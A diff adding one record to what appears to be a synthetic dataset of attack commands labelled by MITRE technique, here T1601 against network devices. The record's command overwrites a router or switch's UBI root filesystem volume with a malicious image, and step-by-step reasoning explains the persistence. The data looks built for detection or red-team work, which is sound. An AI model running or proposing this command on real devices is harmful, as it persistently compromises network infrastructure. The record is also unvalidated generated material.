@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: update UBI rootfs volume'; ubiattach -m 5 >/dev/null && ubiupdatevol /dev/ubi0_0 /tmp/mal_rootfs.squashfs && ubidetach -m 5 && sync",
+  "explanation": "Attaches the UBI device and updates the rootfs volume with a malicious image in-place, altering the persisted operating system contents.",
+  "rationale_steps": [
+    "Attach the UBI device mapped to the rootfs MTD partition (typical on embedded switches/routers).",
+    "Use ubiupdatevol to replace the rootfs volume contents with a crafted image.",
+    "Detach and sync to finalize the on-flash modification."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-775c846e",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
